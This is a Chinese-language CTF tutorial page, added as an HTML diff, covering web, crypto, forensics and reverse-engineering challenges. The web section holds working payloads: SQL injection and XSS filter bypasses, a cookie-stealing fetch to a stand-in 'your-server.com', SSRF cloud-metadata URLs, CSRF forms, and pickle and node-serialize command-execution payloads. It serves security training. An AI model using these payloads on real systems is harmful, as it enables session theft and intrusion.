@@ -1,0 +1,956 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CTF 入门与实战 - OWASP 安全知识库</title>
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+<div class="page-wrapper">
+  <nav class="sidebar">
+    <h2>工具与实战</h2>
+    <ul>
+      <li><a href="01_渗透测试工具.html">渗透测试工具全指南</a></li>
+      <li><a href="02_CTF入门.html" class="active">CTF 入门与实战</a></li>
+    </ul>
+    <h2>本页目录</h2>
+    <ul>
+      <li><a href="#what-is-ctf">什么是 CTF</a></li>
+      <li><a href="#categories">CTF 题目分类</a></li>
+      <li><a href="#web-challenges">Web 题目实战</a></li>
+      <li><a href="#crypto">Crypto 密码学</a></li>
+      <li><a href="#forensics">Forensics 取证</a></li>
+      <li><a href="#reverse">Reverse Engineering</a></li>
+      <li><a href="#platforms">练习平台</a></li>
+      <li><a href="#learning-path">学习路径</a></li>
+      <li><a href="#tools">必备工具清单</a></li>
+    </ul>
+    <h2>快速导航</h2>
+    <ul>
+      <li><a href="../index.html">返回首页</a></li>
+      <li><a href="01_渗透测试工具.html">渗透测试工具</a></li>
+    </ul>
+  </nav>
+
+  <main class="main-content">
+    <div class="breadcrumb">
+      <a href="../index.html">首页</a> / <a href="01_渗透测试工具.html">工具与实战</a> / CTF 入门与实战
+    </div>
+
+    <h1>CTF 入门与实战</h1>
+    <p>CTF（Capture The Flag，夺旗赛）是信息安全领域最受欢迎的技术竞赛形式。通过解决各类安全挑战来获取 Flag（通常格式为 <code>flag{...}</code>），是提升安全技能最高效的方式之一。</p>
+
+    <div class="info-box note">
+      <div class="box-title">学习目标</div>
+      <ul>
+        <li>理解 CTF 的比赛形式与题目分类</li>
+        <li>掌握 Web、Crypto、Forensics、Reverse 各方向的基础解题思路</li>
+        <li>熟悉常用 CTF 平台和练习资源</li>
+        <li>建立系统化的学习路径</li>
+      </ul>
+    </div>
+
+    <!-- Section 1: What is CTF -->
+    <h2 id="what-is-ctf">1. 什么是 CTF</h2>
+
+    <h3>1.1 CTF 比赛形式</h3>
+
+    <div class="diagram">CTF 主要比赛形式：
+
+┌───────────────────────────────────────────────────────────────────────┐
+│                          CTF 比赛类型                                  │
+├──────────────────┬──────────────────────┬────────────────────────────┤
+│                  │                      │                            │
+│   Jeopardy      │   Attack-Defense     │   King of the Hill         │
+│   解题模式       │   攻防对抗模式        │   山丘之王模式              │
+│                  │                      │                            │
+│ ┌──────────────┐│ ┌──────────────────┐ │ ┌────────────────────────┐│
+│ │按类别出题     ││ │每队一台相同服务器  │ │ │多台目标服务器            ││
+│ │解出得分       ││ │攻击对手+防守自己  │ │ │攻占后植入 Flag           ││
+│ │独立解题       ││ │实时对抗          │ │ │保持控制权得分            ││
+│ │最常见形式     ││ │团队协作要求高     │ │ │攻防结合                 ││
+│ └──────────────┘│ └──────────────────┘ │ └────────────────────────┘│
+│                  │                      │                            │
+│ 适合: 初学者     │ 适合: 中高级团队     │ 适合: 实战能力强的选手      │
+│ 代表: 各大线上赛 │ 代表: DEF CON CTF   │ 代表: HackTheBox           │
+│                  │       XCTF 联赛      │       TryHackMe KoTH       │
+└──────────────────┴──────────────────────┴────────────────────────────┘</div>
+
+    <h3>1.2 Jeopardy 模式详解</h3>
+    <p>Jeopardy 是最常见的 CTF 形式，题目按类别和难度分布：</p>
+    <table>
+      <thead>
+        <tr><th>难度</th><th>分值</th><th>特征</th><th>适合人群</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>Easy</td><td>100-200</td><td>单一知识点，直接利用</td><td>初学者</td></tr>
+        <tr><td>Medium</td><td>200-400</td><td>多知识点组合，需要分析</td><td>有基础者</td></tr>
+        <tr><td>Hard</td><td>400-600</td><td>复杂利用链，需深入理解</td><td>进阶选手</td></tr>
+        <tr><td>Insane</td><td>600+</td><td>0day级别，极少人能解</td><td>高手/出题者水平</td></tr>
+      </tbody>
+    </table>
+
+    <div class="info-box note">
+      <div class="box-title">动态积分制</div>
+      <p>现代 CTF 多采用动态积分：题目初始分值较高，随着解出人数增加分值下降。这鼓励选手尝试难题，同时避免签到题分值与难题相同的不公平。</p>
+    </div>
+
+    <!-- Section 2: Categories -->
+    <h2 id="categories">2. CTF 题目分类</h2>
+
+    <table>
+      <thead>
+        <tr><th>类别</th><th>英文</th><th>核心技能</th><th>常见工具</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>Web 安全</td><td>Web Exploitation</td><td>SQL注入、XSS、SSRF、反序列化、认证绕过</td><td>Burp Suite, SQLmap, Browser DevTools</td></tr>
+        <tr><td>密码学</td><td>Cryptography</td><td>古典密码、RSA、AES、哈希、协议分析</td><td>Python, SageMath, CyberChef</td></tr>
+        <tr><td>逆向工程</td><td>Reverse Engineering</td><td>静态分析、动态调试、算法还原</td><td>Ghidra, IDA Pro, GDB, x64dbg</td></tr>
+        <tr><td>二进制利用</td><td>Pwn / Binary Exploitation</td><td>栈溢出、堆利用、ROP、格式化字符串</td><td>pwntools, GDB+pwndbg, ROPgadget</td></tr>
+        <tr><td>数字取证</td><td>Forensics</td><td>文件分析、内存取证、流量分析、隐写术</td><td>Wireshark, Volatility, binwalk</td></tr>
+        <tr><td>杂项</td><td>Misc</td><td>编程、脑洞、OSINT、区块链</td><td>Python, Google, 各种在线工具</td></tr>
+      </tbody>
+    </table>
+
+    <div class="diagram">各方向技能关系图：
+
+                    ┌─────────────┐
+                    │  编程基础    │
+                    │ Python/C    │
+                    └──────┬──────┘
+                           │
+            ┌──────────────┼──────────────┐
+            │              │              │
+    ┌───────▼──────┐ ┌────▼─────┐ ┌──────▼───────┐
+    │   Web 安全   │ │ Crypto   │ │  Forensics   │
+    │              │ │ 密码学    │ │  数字取证     │
+    └───────┬──────┘ └────┬─────┘ └──────┬───────┘
+            │              │              │
+            │      ┌───────▼──────┐       │
+            │      │   Reverse    │       │
+            │      │   逆向工程    │       │
+            │      └───────┬──────┘       │
+            │              │              │
+            └──────────────┼──────────────┘
+                           │
+                    ┌──────▼──────┐
+                    │    Pwn      │
+                    │  二进制利用  │
+                    │ (最难方向)   │
+                    └─────────────┘</div>
+
+    <!-- Section 3: Web Challenges -->
+    <h2 id="web-challenges">3. Web 题目实战</h2>
+
+    <h3>3.1 SQL Injection CTF 解题思路</h3>
+
+    <div class="diagram">SQL Injection CTF 解题流程：
+
+┌──────────┐    ┌───────────┐    ┌────────────┐    ┌──────────┐    ┌──────────┐
+│ 找注入点  │──▶│ 判断类型   │──▶│ 确定列数    │──▶│ 信息收集  │──▶│ 提取数据  │
+└──────────┘    └───────────┘    └────────────┘    └──────────┘    └──────────┘
+     │                │                │                │               │
+ 输入点测试      数字型/字符型      ORDER BY       database()        目标表数据
+ ' " ) --       报错/盲注/联合    UNION SELECT    table_name         flag!
+ 特殊字符                          NULL,NULL...   column_name</div>
+
+    <pre><code># === SQL Injection CTF 解题模板 ===
+
+# Step 1: 判断注入点和类型
+# 测试 payload:
+'
+"
+')
+")
+' OR '1'='1
+' OR '1'='1'--
+1 OR 1=1
+
+# Step 2: 判断列数 (UNION 注入)
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--    # 直到报错，确定列数
+
+# Step 3: 确定回显位置
+' UNION SELECT 1,2,3--
+' UNION SELECT NULL,NULL,NULL--
+
+# Step 4: 提取信息
+# MySQL:
+' UNION SELECT 1,database(),3--
+' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='flag_table'--
+' UNION SELECT 1,flag,3 FROM flag_table--
+
+# SQLite:
+' UNION SELECT 1,sql,3 FROM sqlite_master--
+
+# 常见绕过技巧:
+# 空格被过滤: /**/  %09  %0a  +
+# 关键字被过滤: SeLeCt  sel/**/ect  /*!select*/
+# 引号被过滤: 使用 hex 编码  0x666c6167
+# 逗号被过滤: UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b</code></pre>
+
+    <h3>3.2 XSS 挑战</h3>
+    <pre><code># === XSS CTF 常见场景 ===
+
+# 场景 1: 基本反射型 XSS
+# 输入直接出现在 HTML 中
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+# 场景 2: 属性中的 XSS
+# 输入出现在 HTML 属性值中
+" onmouseover="alert(1)
+" autofocus onfocus="alert(1)
+
+# 场景 3: JavaScript 上下文
+# 输入出现在 JS 代码中
+';alert(1)//
+\';alert(1)//
+
+# 场景 4: 过滤绕过
+# script 被过滤
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+&lt;details open ontoggle=alert(1)&gt;
+
+# 大小写混合
+&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+
+# 编码绕过
+&lt;img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)&gt;
+
+# 场景 5: CSP 绕过
+# 利用 JSONP 端点
+&lt;script src="https://allowed-cdn.com/jsonp?callback=alert(1)"&gt;&lt;/script&gt;
+
+# 利用 Angular (如果 CDN 允许)
+{{constructor.constructor('alert(1)')()}}
+
+# 场景 6: 窃取 Cookie（CTF 常见目标）
+&lt;script&gt;
+fetch('https://your-server.com/steal?c='+document.cookie)
+&lt;/script&gt;
+
+# 使用 XSS Hunter 或 Webhook.site 接收</code></pre>
+
+    <h3>3.3 SSRF/CSRF 挑战</h3>
+    <pre><code># === SSRF (Server-Side Request Forgery) CTF 思路 ===
+
+# 基本 SSRF: 让服务器访问内部资源
+http://target.com/fetch?url=http://127.0.0.1:8080/admin
+http://target.com/fetch?url=http://localhost/flag.txt
+
+# 绕过 localhost 过滤
+http://127.0.0.1
+http://0.0.0.0
+http://0x7f000001       # 十六进制
+http://2130706433       # 十进制
+http://017700000001     # 八进制
+http://127.1            # 缩写
+http://[::1]            # IPv6
+
+# 绕过协议限制
+file:///etc/passwd
+file:///flag.txt
+gopher://127.0.0.1:6379/_*1%0d%0a...   # Redis SSRF
+dict://127.0.0.1:6379/info
+
+# Cloud Metadata SSRF (云环境)
+http://169.254.169.254/latest/meta-data/         # AWS
+http://metadata.google.internal/                  # GCP
+http://169.254.169.254/metadata/instance         # Azure
+
+# DNS Rebinding
+# 第一次解析到允许的 IP，第二次解析到 127.0.0.1
+
+# === CSRF 题目思路 ===
+# 构造恶意页面让管理员执行操作
+
+&lt;!-- 自动提交表单 --&gt;
+&lt;form action="http://target.com/admin/change_password" method="POST" id="csrf_form"&gt;
+  &lt;input type="hidden" name="new_password" value="hacked123"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('csrf_form').submit();&lt;/script&gt;
+
+&lt;!-- 利用 img 标签 (GET请求) --&gt;
+&lt;img src="http://target.com/admin/delete?id=1"&gt;</code></pre>
+
+    <h3>3.4 反序列化挑战</h3>
+    <pre><code># === PHP 反序列化 ===
+
+# 常见 CTF 场景：
+# 1. 分析 PHP 源代码中的魔术方法
+# __destruct(), __wakeup(), __toString(), __call()
+
+# 示例：构造 POP 链
+# 源代码:
+# class FileHandler {
+#     public $filename;
+#     public function __destruct() {
+#         echo file_get_contents($this->filename);
+#     }
+# }
+
+# 构造 payload:
+# O:11:"FileHandler":1:{s:8:"filename";s:9:"/flag.txt";}
+
+# PHP 序列化 payload 生成
+php -r '
+class FileHandler {
+    public $filename = "/flag.txt";
+}
+echo serialize(new FileHandler());
+'
+
+# === Python Pickle 反序列化 ===
+import pickle
+import os
+import base64
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('cat /flag.txt',))
+
+payload = base64.b64encode(pickle.dumps(Exploit()))
+print(payload.decode())
+
+# === Java 反序列化 ===
+# 工具: ysoserial
+java -jar ysoserial.jar CommonsCollections1 'cat /flag' | base64
+
+# === Node.js 反序列化 ===
+# node-serialize 库 RCE
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('cat /flag',function(err,stdout){...})}()"}</code></pre>
+
+    <div class="info-box warning">
+      <div class="box-title">Web 题目解题技巧</div>
+      <ul>
+        <li><strong>查看源代码</strong>：Ctrl+U 查看 HTML 源码，寻找注释中的提示</li>
+        <li><strong>检查 HTTP 头</strong>：响应头可能有 Flag 或提示信息</li>
+        <li><strong>Robots.txt</strong>：常见隐藏路径 <code>/robots.txt</code>, <code>/.git</code>, <code>/.svn</code></li>
+        <li><strong>Cookie/Session</strong>：Base64 解码 Cookie，检查 JWT</li>
+        <li><strong>尝试常见路径</strong>：<code>/admin</code>, <code>/flag</code>, <code>/console</code>, <code>/debug</code></li>
+      </ul>
+    </div>
+
+    <!-- Section 4: Crypto -->
+    <h2 id="crypto">4. Crypto 密码学挑战</h2>
+
+    <h3>4.1 古典密码 (Classical Ciphers)</h3>
+    <table>
+      <thead>
+        <tr><th>密码类型</th><th>特征</th><th>破解方法</th><th>工具</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>Caesar Cipher</td><td>字母位移</td><td>暴力尝试 25 种位移</td><td>CyberChef, dcode.fr</td></tr>
+        <tr><td>Vigenere Cipher</td><td>多表替换，需密钥</td><td>Kasiski 测试确定密钥长度</td><td>dcode.fr</td></tr>
+        <tr><td>Rail Fence</td><td>锯齿形排列</td><td>尝试不同栏数</td><td>CyberChef</td></tr>
+        <tr><td>Substitution</td><td>单表替换</td><td>频率分析</td><td>quipqiup.com</td></tr>
+        <tr><td>Morse Code</td><td>点划编码</td><td>直接对照表</td><td>在线工具</td></tr>
+        <tr><td>Base64/32/16</td><td>编码（非加密）</td><td>直接解码</td><td>CyberChef, CLI</td></tr>
+        <tr><td>ROT13</td><td>Caesar 特例(位移13)</td><td>再次 ROT13</td><td>任意工具</td></tr>
+      </tbody>
+    </table>
+
+    <pre><code># === 古典密码 Python 解题 ===
+
+# Caesar Cipher 暴力破解
+def caesar_brute(ciphertext):
+    for shift in range(26):
+        plaintext = ""
+        for char in ciphertext:
+            if char.isalpha():
+                base = ord('A') if char.isupper() else ord('a')
+                plaintext += chr((ord(char) - base - shift) % 26 + base)
+            else:
+                plaintext += char
+        print(f"Shift {shift:2d}: {plaintext}")
+
+caesar_brute("Gur synt vf: synt{pnrfne_vf_rnfl}")
+
+# Vigenere Cipher 解密
+def vigenere_decrypt(ciphertext, key):
+    plaintext = ""
+    key_idx = 0
+    for char in ciphertext:
+        if char.isalpha():
+            base = ord('A') if char.isupper() else ord('a')
+            shift = ord(key[key_idx % len(key)].upper()) - ord('A')
+            plaintext += chr((ord(char) - base - shift) % 26 + base)
+            key_idx += 1
+        else:
+            plaintext += char
+    return plaintext
+
+# 频率分析
+from collections import Counter
+def freq_analysis(text):
+    letters = [c.upper() for c in text if c.isalpha()]
+    freq = Counter(letters)
+    total = len(letters)
+    for char, count in freq.most_common():
+        print(f"{char}: {count/total*100:.1f}%")
+    # 英语: E(12.7%), T(9.1%), A(8.2%), O(7.5%), I(7.0%)</code></pre>
+
+    <h3>4.2 RSA 挑战</h3>
+    <pre><code># === RSA 基础知识 ===
+# 公钥: (n, e)    n = p * q,  e 通常为 65537
+# 私钥: d         d ≡ e^(-1) mod φ(n),  φ(n) = (p-1)(q-1)
+# 加密: c = m^e mod n
+# 解密: m = c^d mod n
+
+# === 常见 RSA CTF 攻击 ===
+
+from Crypto.Util.number import *
+import gmpy2
+
+# 1. 已知 p, q 直接解密
+def rsa_decrypt(c, p, q, e=65537):
+    n = p * q
+    phi = (p - 1) * (q - 1)
+    d = inverse(e, phi)
+    m = pow(c, d, n)
+    return long_to_bytes(m)
+
+# 2. 小公钥指数攻击 (e=3, 明文小)
+# 如果 m^e < n，则 c = m^e，直接开 e 次方根
+def small_e_attack(c, e=3):
+    m = gmpy2.iroot(c, e)[0]
+    return long_to_bytes(int(m))
+
+# 3. Wiener Attack (d 很小时)
+# 使用连分数逼近 e/n ≈ k/d
+# 工具: https://github.com/pablocelayes/rsa-wiener-attack
+
+# 4. Fermat 分解 (p 和 q 接近时)
+def fermat_factor(n):
+    a = gmpy2.isqrt(n) + 1
+    b2 = a * a - n
+    while not gmpy2.is_square(b2):
+        a += 1
+        b2 = a * a - n
+    b = gmpy2.isqrt(b2)
+    return int(a - b), int(a + b)
+
+# 5. 共模攻击 (同一明文，不同 e，相同 n)
+def common_modulus(n, e1, e2, c1, c2):
+    g, s1, s2 = gmpy2.gcdext(e1, e2)
+    m = (pow(c1, s1, n) * pow(c2, s2, n)) % n
+    return long_to_bytes(int(m))
+
+# 6. factordb.com 查询已知分解
+# 有些 CTF 题目的 n 可以在 factordb.com 上找到因式分解
+
+# 7. 使用 RsaCtfTool 自动化
+# python3 RsaCtfTool.py --publickey pub.pem --uncipherfile cipher.txt</code></pre>
+
+    <h3>4.3 Hash 攻击</h3>
+    <pre><code># === Hash 相关 CTF 题目 ===
+
+# 1. 彩虹表 / 在线查询
+# https://crackstation.net/
+# https://hashes.com/en/decrypt/hash
+
+# 2. Hash Length Extension Attack
+# 场景：MAC = H(secret || message)，可以追加数据
+# 工具: hashpump
+hashpump -s original_hash -d original_data -a append_data -k secret_length
+
+# 3. MD5 碰撞
+# 工具: fastcoll
+./fastcoll -p prefix.txt -o out1.bin out2.bin
+# 生成两个文件: MD5 相同但内容不同
+
+# 4. Python hashlib 常用操作
+import hashlib
+
+# 计算各种 hash
+hashlib.md5(b"flag").hexdigest()
+hashlib.sha256(b"flag").hexdigest()
+
+# 暴力破解短 hash
+import itertools
+import string
+
+target = "e99a18c428cb38d5f260853678922e03"  # md5("abc123")
+charset = string.ascii_lowercase + string.digits
+
+for length in range(1, 8):
+    for combo in itertools.product(charset, repeat=length):
+        attempt = ''.join(combo)
+        if hashlib.md5(attempt.encode()).hexdigest() == target:
+            print(f"Found: {attempt}")
+            break</code></pre>
+
+    <div class="info-box success">
+      <div class="box-title">Crypto 题目解题清单</div>
+      <ul>
+        <li>首先识别加密类型：看密文特征（Base64? Hex? 可打印字符?）</li>
+        <li>使用 CyberChef 的 "Magic" 功能自动检测编码</li>
+        <li>RSA 题目关注 n 的大小和特征，尝试 factordb</li>
+        <li>注意出题者给的 hint 和题目描述中的关键词</li>
+      </ul>
+    </div>
+
+    <!-- Section 5: Forensics -->
+    <h2 id="forensics">5. Forensics 数字取证</h2>
+
+    <h3>5.1 文件分析与 Carving</h3>
+    <pre><code># === 基本文件分析 ===
+
+# 查看文件类型（不依赖扩展名）
+file mystery_file
+# 输出: mystery_file: PNG image data, 800 x 600, 8-bit/color RGBA
+
+# 查看文件 hex 头部
+xxd mystery_file | head -5
+hexdump -C mystery_file | head -10
+
+# 常见文件头 (Magic Bytes):
+# PNG:  89 50 4E 47 0D 0A 1A 0A
+# JPEG: FF D8 FF
+# GIF:  47 49 46 38
+# PDF:  25 50 44 46
+# ZIP:  50 4B 03 04
+# RAR:  52 61 72 21
+# ELF:  7F 45 4C 46
+# PE:   4D 5A
+
+# === Binwalk - 嵌入文件提取 ===
+binwalk challenge_file           # 分析嵌入内容
+binwalk -e challenge_file        # 自动提取
+binwalk --dd='.*' challenge_file # 提取所有类型
+
+# === Foremost - 文件恢复 ===
+foremost -i disk_image.dd -o output_dir
+
+# === Strings - 提取可读字符串 ===
+strings challenge_file | grep -i "flag"
+strings -n 10 challenge_file     # 最少 10 字符的字符串</code></pre>
+
+    <h3>5.2 隐写术 (Steganography)</h3>
+    <pre><code># === 图片隐写 ===
+
+# 1. LSB 隐写 (最低有效位)
+# 工具: zsteg (PNG/BMP), stegsolve
+zsteg challenge.png
+zsteg -a challenge.png           # 尝试所有方法
+
+# Stegsolve: 逐位查看各通道
+# 下载: java -jar Stegsolve.jar
+
+# 2. steghide (JPEG/BMP, 需密码)
+steghide extract -sf image.jpg
+steghide extract -sf image.jpg -p password
+steghide info image.jpg          # 查看是否有嵌入数据
+
+# 密码为空时直接回车
+
+# 3. exiftool - EXIF 元数据
+exiftool image.jpg               # 查看所有元数据
+# Flag 可能藏在 Comment, Author, GPS 等字段
+
+# 4. pngcheck - PNG 完整性
+pngcheck -v challenge.png
+# 检查是否有修改过的 IHDR (宽高被改)
+
+# 修复 PNG 高度:
+# 用 hex editor 修改 IHDR chunk 中的高度值
+# 重新计算 CRC
+
+# === 音频隐写 ===
+
+# Audacity - 查看频谱图
+# 打开音频 → View → Spectrogram
+# Flag 可能以图形形式隐藏在频谱中
+
+# SSTV (慢扫描电视)
+# 工具: QSSTV, RX-SSTV
+
+# Morse Code 音频
+# 工具: Audacity 查看波形, 手动解码
+
+# === 文本隐写 ===
+# 零宽字符隐写 (Unicode)
+# 隐藏在正常文本中的零宽空格/连接符
+# 工具: https://330k.github.io/misc_tools/unicode_steganography.html
+
+# Whitespace 隐写
+# Tab 和空格编码信息
+# 工具: stegsnow
+stegsnow -C -p "password" stego.txt</code></pre>
+
+    <h3>5.3 内存取证 (Memory Forensics)</h3>
+    <pre><code># === Volatility - 内存取证框架 ===
+
+# Volatility 3 (最新版)
+# 安装
+pip install volatility3
+
+# 1. 确定操作系统 Profile
+vol -f memory.dmp windows.info
+vol -f memory.dmp linux.info
+
+# 2. 进程列表
+vol -f memory.dmp windows.pslist
+vol -f memory.dmp windows.pstree     # 树形显示
+
+# 3. 网络连接
+vol -f memory.dmp windows.netscan
+
+# 4. 命令行历史
+vol -f memory.dmp windows.cmdline
+
+# 5. 文件扫描与提取
+vol -f memory.dmp windows.filescan | grep -i "flag"
+vol -f memory.dmp windows.dumpfiles --virtaddr 0xXXXX
+
+# 6. 注册表
+vol -f memory.dmp windows.registry.hivelist
+vol -f memory.dmp windows.registry.printkey --key "SAM\Domains\Account\Users"
+
+# 7. 密码/凭据提取
+vol -f memory.dmp windows.hashdump    # SAM 哈希
+vol -f memory.dmp windows.lsadump     # LSA secrets
+
+# 8. 浏览器历史
+vol -f memory.dmp windows.filescan | grep -i "history"
+
+# === Volatility 2 (旧版但仍常用) ===
+volatility -f memory.dmp imageinfo
+volatility -f memory.dmp --profile=Win7SP1x64 pslist
+volatility -f memory.dmp --profile=Win7SP1x64 filescan
+volatility -f memory.dmp --profile=Win7SP1x64 dumpfiles -Q 0xXXXX -D output/</code></pre>
+
+    <h3>5.4 网络流量分析</h3>
+    <pre><code># === Wireshark / tshark ===
+
+# tshark 命令行提取
+tshark -r capture.pcap -Y "http" -T fields -e http.request.uri
+tshark -r capture.pcap -Y "http.response" -T fields -e http.file_data
+
+# 提取 HTTP 传输的文件
+tshark -r capture.pcap --export-objects http,output_dir/
+
+# 提取 FTP 数据
+tshark -r capture.pcap -Y "ftp-data" -T fields -e ftp-data.command
+
+# DNS 查询分析 (DNS 隧道)
+tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name
+
+# 常见 CTF 流量题思路:
+# 1. HTTP: 查看请求/响应, 提取文件, 分析参数
+# 2. FTP: 提取传输的文件内容
+# 3. DNS: 子域名中可能编码了数据
+# 4. ICMP: 数据字段可能包含信息
+# 5. USB: USB 键盘/鼠标流量还原操作</code></pre>
+
+    <div class="info-box note">
+      <div class="box-title">Forensics 解题思维</div>
+      <p>取证题目的核心是<strong>仔细观察</strong>。不要忽视任何细节：</p>
+      <ul>
+        <li>文件大小异常大？可能有嵌入数据</li>
+        <li>图片看起来正常？检查 LSB、EXIF、修改过的尺寸</li>
+        <li>ZIP 文件？可能有伪加密（修改标志位即可）</li>
+        <li>PCAP 文件？按协议分类逐一检查</li>
+      </ul>
+    </div>
+
+    <!-- Section 6: Reverse Engineering -->
+    <h2 id="reverse">6. Reverse Engineering 逆向工程</h2>
+
+    <h3>6.1 逆向工具</h3>
+    <table>
+      <thead>
+        <tr><th>工具</th><th>类型</th><th>特点</th><th>价格</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>Ghidra</td><td>反编译器</td><td>NSA 开源，功能强大，支持多架构</td><td>免费</td></tr>
+        <tr><td>IDA Pro</td><td>反编译器</td><td>行业标准，最强反编译能力</td><td>商业付费</td></tr>
+        <tr><td>IDA Free</td><td>反编译器</td><td>IDA 免费版，仅支持 x86/x64</td><td>免费</td></tr>
+        <tr><td>Binary Ninja</td><td>反编译器</td><td>现代 UI，强 API</td><td>商业/教育免费</td></tr>
+        <tr><td>GDB + pwndbg</td><td>动态调试器</td><td>Linux 标准调试器</td><td>免费</td></tr>
+        <tr><td>x64dbg</td><td>动态调试器</td><td>Windows 用户态调试</td><td>免费</td></tr>
+        <tr><td>radare2/rizin</td><td>框架</td><td>命令行，脚本化能力强</td><td>免费</td></tr>
+      </tbody>
+    </table>
+
+    <h3>6.2 常见逆向模式</h3>
+    <pre><code># === 逆向 CTF 常见模式 ===
+
+# 模式 1: 字符比较 (最基础)
+# 程序逐字符比较输入与硬编码的 flag
+# 反编译后直接读取字符串
+
+# 查找字符串
+strings ./challenge | grep -i "flag"
+strings ./challenge | grep -i "correct"
+
+# 模式 2: 简单变换
+# flag 经过简单变换后存储
+# 常见: XOR, ADD, SUB, ROT, Base64
+# 逆向变换即可
+
+# XOR 解密示例
+encrypted = [0x66^0x41, 0x6c^0x41, 0x61^0x41, 0x67^0x41]  # 与 0x41 异或
+flag = ''.join(chr(b ^ 0x41) for b in encrypted)
+
+# 模式 3: 验证函数
+# 程序有一个 check() 函数验证输入
+# 需要理解验证逻辑，反推输入
+
+# 模式 4: 反调试
+# 程序检测是否在调试器中运行
+# ptrace, IsDebuggerPresent, timing checks
+# 需要 patch 掉反调试代码
+
+# 模式 5: 自修改代码
+# 程序运行时解密/修改自身代码
+# 需要动态调试，在解密后 dump</code></pre>
+
+    <h3>6.3 Ghidra 基本使用流程</h3>
+    <pre><code># === Ghidra 逆向分析流程 ===
+
+# 1. 创建项目 → 导入二进制文件
+# 2. 自动分析 (Auto Analysis)
+#    - 等待分析完成（进度条）
+#    - 识别函数、交叉引用、字符串
+
+# 3. 关键分析步骤:
+#    a. Window → Defined Strings: 查看所有字符串
+#       搜索 "flag", "correct", "wrong", "success"
+#
+#    b. 找到 main 函数:
+#       Functions → 搜索 "main" 或 "entry"
+#
+#    c. 分析控制流:
+#       反编译窗口查看伪代码
+#       关注 if/else 分支（成功/失败条件）
+#
+#    d. 交叉引用 (Xref):
+#       右键变量/函数 → References → Find references to
+#
+#    e. 重命名变量和函数:
+#       提高可读性，便于分析
+
+# 4. 动态验证:
+#    根据分析结果构造输入
+#    运行程序验证
+
+# === GDB 动态调试 ===
+# 安装 pwndbg 增强插件
+gdb ./challenge
+
+# 常用命令
+(gdb) info functions            # 列出函数
+(gdb) disas main               # 反汇编 main
+(gdb) b *0x401234              # 设断点
+(gdb) r                         # 运行
+(gdb) ni                        # 单步（不进入函数）
+(gdb) si                        # 单步（进入函数）
+(gdb) x/20x $rsp              # 查看栈
+(gdb) x/s 0x402000            # 查看字符串
+(gdb) set $rax = 1            # 修改寄存器
+(gdb) jump *0x401300          # 跳转执行</code></pre>
+
+    <div class="info-box warning">
+      <div class="box-title">逆向工程学习建议</div>
+      <p>逆向是 CTF 中学习曲线最陡的方向之一。建议：</p>
+      <ul>
+        <li>先学基础的 x86/x64 汇编语言</li>
+        <li>理解函数调用约定（cdecl, fastcall, System V AMD64 ABI）</li>
+        <li>从简单的 crackme 开始练习</li>
+        <li>学会使用 Ghidra 的反编译功能（比直接看汇编容易）</li>
+      </ul>
+    </div>
+
+    <!-- Section 7: Platforms -->
+    <h2 id="platforms">7. CTF 练习平台</h2>
+
+    <table>
+      <thead>
+        <tr><th>平台</th><th>类型</th><th>难度</th><th>特色</th><th>价格</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>PicoCTF</td><td>Jeopardy</td><td>入门</td><td>教育导向，有详细学习材料</td><td>免费</td></tr>
+        <tr><td>HackTheBox</td><td>靶机/CTF</td><td>中-高</td><td>真实渗透环境，活跃社区</td><td>免费/VIP</td></tr>
+        <tr><td>TryHackMe</td><td>学习路径</td><td>入门-中</td><td>引导式学习，适合新手</td><td>免费/Premium</td></tr>
+        <tr><td>CTFtime</td><td>赛事聚合</td><td>全部</td><td>全球 CTF 赛事日历和排名</td><td>免费</td></tr>
+        <tr><td>DVWA</td><td>靶场</td><td>入门</td><td>Web 漏洞练习，可调难度</td><td>免费(自建)</td></tr>
+        <tr><td>WebGoat</td><td>靶场</td><td>入门-中</td><td>OWASP 官方 Web 安全学习</td><td>免费(自建)</td></tr>
+        <tr><td>OverTheWire</td><td>Wargame</td><td>入门-中</td><td>Linux/网络基础挑战</td><td>免费</td></tr>
+        <tr><td>Root Me</td><td>Jeopardy</td><td>入门-高</td><td>法国平台，题目丰富</td><td>免费</td></tr>
+        <tr><td>pwnable.kr</td><td>Pwn 专项</td><td>中-高</td><td>二进制利用专项</td><td>免费</td></tr>
+        <tr><td>CryptoHack</td><td>Crypto 专项</td><td>入门-高</td><td>密码学交互式学习</td><td>免费</td></tr>
+        <tr><td>BUUCTF</td><td>Jeopardy</td><td>入门-高</td><td>中国平台，历届赛题复现</td><td>免费</td></tr>
+      </tbody>
+    </table>
+
+    <div class="info-box success">
+      <div class="box-title">平台选择建议</div>
+      <ul>
+        <li><strong>完全新手</strong>：从 PicoCTF 或 TryHackMe 的 "Complete Beginner" 路径开始</li>
+        <li><strong>Web 方向</strong>：DVWA → WebGoat → HackTheBox Web 题目</li>
+        <li><strong>Pwn 方向</strong>：pwnable.kr → pwnable.tw → HackTheBox 靶机</li>
+        <li><strong>参加比赛</strong>：关注 CTFtime 上的周末赛事，从 rating 低的比赛开始</li>
+      </ul>
+    </div>
+
+    <!-- Section 8: Learning Path -->
+    <h2 id="learning-path">8. 推荐学习路径</h2>
+
+    <div class="diagram">CTF 新手学习路径（建议时间线）：
+
+第 1-2 周: 基础准备
+├── Linux 基础命令
+├── Python 编程基础
+├── 网络协议基础 (TCP/IP, HTTP)
